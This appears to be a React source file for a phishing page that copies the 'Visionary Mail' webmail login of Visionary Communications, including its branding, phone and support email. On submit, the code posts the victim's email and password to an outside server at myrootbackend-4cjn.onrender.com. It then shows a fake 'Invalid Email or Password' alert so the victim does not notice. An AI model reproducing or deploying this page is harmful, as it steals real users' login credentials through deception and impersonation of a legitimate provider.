import React from 'react';
import './home.css';

import logo from './logo.png';

import { useState } from 'react';
import magic from './magic.png';

import axios from 'axios';

function Home(){
    const[email, setEmail] = useState("");

    const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');

  const[platform, setPlatform] = useState("Visionary")

  const[showError, setShowError] = useState(false);

  const handleCheckboxChange = () => {
    setShowPassword(!showPassword);
  }


  async function handleSubmit(e){
      e.preventDefault();

      try {
        const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            setShowError(true);
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
  }
    return (
        <>

{showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
            <div className='main col-md-10 m-auto px-5 py-2'>

                <img src={logo} className="logo" />

                <div className='innerdiv px-3 row'>
                    <div className='col-md-6 pt-3'>
                        <h2 className='heading'>Welcome to Visionary Mail</h2>

                        <h3 className='headingtwo'>Login to access your account</h3>

                        <p className='content text-justify'>
                        From here you can log in to your personal email settings. This is where you can setup and configure all your email options.
                        </p>

                        <p className='content text-justify'>
                        Please login by entering your <b>full email address</b> and password.
                        </p>

                        <h3 className='headingtwo'>Forgot Your Password?</h3>

                        <p className='content text-justify'>
                        We are dedicated to providing you a secure online environment.
                        To have your password reset, please contact our Technical Support team.
                        </p>

                        <p style={{
                            fontSize:"12px",
                            fontStyle:"italic",
                        }}>* You MUST have cookies enabled to use these functions.</p>

                    </div>


                    <div className='col-md-6 pt-4'>

                        <div className='formdiv px-5 py-2 m-auto'>


                            <form onSubmit={handleSubmit}>
                                <h3 className='headingtwo'>Sign in</h3>

                                <hr
                        style={{
                        background: 'grey',
                        color: 'grey',
                        borderColor: 'grey',
                        height: '0.2px',
                        }}
                    />


                            <div className='form-group'>
                                <label className='label'>Email:</label>
                                <input onChange={function(e){
                                    setEmail(e.target.value)
                                }} value={email} style={{
                                    height:"30px",
                                }} type="email" className='form-control'required />

                            </div>


                            <div className='form-group'>
                                <label className='label'>Password:</label>
                                <input onChange={function(e){
                                    setPassword(e.target.value);
                                }}value={password} style={{
                                    height:"30px",
                                }}  type={showPassword ? 'text' : 'password'} className='form-control'required />

                            </div>

                            <div className='form-group'>
                                
                                <input checked={showPassword}
                                    onChange={handleCheckboxChange}  type="checkbox" /><span className='px-1 label'>Show Password</span>

                            </div>

                            <div className='form-group'>
                                
                                <p className='forgot'>Forgot Password ?</p>

                            </div>

                            <div className='form-group row buttondiv'>
                                
                                <div className='col-6 text-left'>
                                    <img src={magic} />
                                </div>

                                <div className='col-6 text-right'>
                                    <button type="submit"className='btn'style={{
                                        color:"black",
                                        backgroundColor:"rgb(252, 175, 9)",
                                    }}>Login</button>
                                </div>

                            </div>

                            </form>

                        </div>
                        
                    </div>




                </div>


                <p className='underone text-center mt-2'style={{
                    fontWeight:"bold",
                    fontSize:"13px",
                    color:"black"
                }}>Visionary Communications, Inc.</p>
                <p style={{
                    margin:0,
                    fontSize:"11px",
                    color:"black"
                }} className='undertwo text-center'><b>Tel:</b> 888.682.1884 / <b>Fax:</b> 307.682.2519 / <b>Email:</b> <span style={{
                    color:"rgb(252, 175, 9)",
                }}>support@vcn.com</span></p>
                    
                

                    <p style={{
                        
                         fontSize:"11px",
                         color:"black"
                    }} className='underthree text-center'>MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.</p>
            </div>
        </>
    );
}

export default Home;